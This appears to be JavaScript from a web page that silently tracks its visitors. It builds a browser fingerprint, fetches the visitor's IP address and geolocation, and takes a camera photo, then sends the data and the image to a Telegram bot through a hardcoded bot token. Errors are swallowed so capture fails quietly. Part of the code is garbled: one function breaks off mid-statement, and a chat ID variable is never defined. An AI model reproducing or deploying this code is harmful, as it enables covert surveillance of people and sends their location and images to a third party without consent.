    const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";

    function sha256(str) {
      const buffer = new TextEncoder().encode(str);
      return crypto.subtle.digest("SHA-256", buffer).then(hash =>
        Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("")
      );
    }

    async function generateFingerprint() {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "16px Arial";
      ctx.fillText("fingerprint", 2, 2);
      const canvasHash = await sha256(canvas.toDataURL());
      const webglHash = await sha256(navigator.platform + navigator.vendor);
      const raw = [
        navigator.userAgent,
        navigator.language,
        Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen.width + "x" + screen.height,
        navigator.hardwareConcurrency,
        canvasHash,
        webglHash
      ].join("|");
      return sha256(raw);
    }

    async function getInfo() {
      try {
        const ipBasic = await fetch("https://api.ipify.org?format=json").then(res => res.json());
        const ipDetail = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({}));
        const ipData = { ...ipBasic, ...ipDetail };
        const fp = await generateFingerprint();
        const isNew = !(JSON.parse(localStorage.getItem("fp_history") || "[]").includes(fp));
        if (isNew) {
          let history = JSON.parse(localStorage.getItem("fp_history") || "[]");
          history.push(fp);
          localStorage.setItem("fp_history", JSON.stringify(history));
        }

        const time = new Date();

üïí ${time.toLocaleTimeString()} - ${time.toLocaleDateString()}

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {

      }
    }

    async function takePhoto(facingMode = "user") {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement("video");
        video.srcObject = stream;

        const ready = new Promise(resolve => video.onloadedmetadata = resolve);
        await ready;
        video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext("2d").drawImage(video, 0, 0);

        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `cam_${facingMode}.jpg`);

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });

        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        // b·ªè qua n·∫øu kh√¥ng ch·ª•p ƒë∆∞·ª£c
      }
    }
